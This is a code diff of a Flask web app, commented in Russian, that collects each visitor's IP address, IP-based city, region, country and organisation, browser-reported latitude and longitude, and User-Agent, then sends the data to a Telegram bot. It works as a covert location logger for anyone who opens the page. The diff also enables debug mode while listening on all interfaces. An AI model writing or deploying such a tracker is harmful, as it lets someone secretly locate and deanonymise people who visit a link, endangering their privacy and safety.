@@ -1,7 +1,7 @@
-import urllib3
-import requests
+from flask import Flask, request, render_template
 import requests
 import telegram
+import json
 
 app = Flask(__name__)
 
@@ -16,40 +16,45 @@ def send_telegram_message(message):
 
 @app.route('/')
 def index():
-    # Получаем IP пользователя
-    user_ip = request.remote_addr
+    return render_template('index.html')  # Отображаем HTML для получения геопозиции
 
-    # Получаем геопозицию и информацию через сервис ipinfo.io
-    geo_info = requests.get(f'http://ipinfo.io/{user_ip}/json').json()
+@app.route('/send_data', methods=['POST'])
+def send_data():
+    user_ip = request.remote_addr  # Получаем IP пользователя
+    geo_info = requests.get(f'http://ipinfo.io/{user_ip}/json').json()  # Информация о пользователе
 
-    # Извлекаем информацию
+    # Информация с клиента (широта и долгота через JS)
+    client_data = request.json
+    latitude = client_data.get("latitude", "Неизвестно")
+    longitude = client_data.get("longitude", "Неизвестно")
+
+    # Извлекаем информацию из ipinfo
     ip = geo_info.get("ip", "Неизвестно")
     city = geo_info.get("city", "Неизвестно")
     region = geo_info.get("region", "Неизвестно")
     country = geo_info.get("country", "Неизвестно")
     org = geo_info.get("org", "Неизвестно")
-    loc = geo_info.get("loc", "Неизвестно")  # Широта и долгота
-    postal = geo_info.get("postal", "Неизвестно")
 
-    # Информация о браузере и операционной системе
+    # Информация о браузере и ОС
     user_agent = request.headers.get('User-Agent', 'Неизвестно')
 
-    # Формируем сообщение с максимальной информацией
+    # Формируем сообщение
     message = (
         f"IP пользователя: {ip}\n"
         f"Город: {city}\n"
         f"Регион: {region}\n"
         f"Страна: {country}\n"
         f"Организация: {org}\n"
-        f"Местоположение (широта, долгота): {loc}\n"
-        f"Почтовый индекс: {postal}\n"
-        f"User-Agent (информация о браузере и ОС): {user_agent}"
+        f"Широта: {latitude}\n"
+        f"Долгота: {longitude}\n"
+        f"User-Agent: {user_agent}"
     )
 
     # Отправляем сообщение в Telegram
     send_telegram_message(message)
 
-    return "Данные отправлены боту!"
+    return "Данные отправлены боту!", 200
 
 if __name__ == "__main__":
-    app.run(debug=False, host='0.0.0.0')
+    app.run(debug=True, host='0.0.0.0')
+    
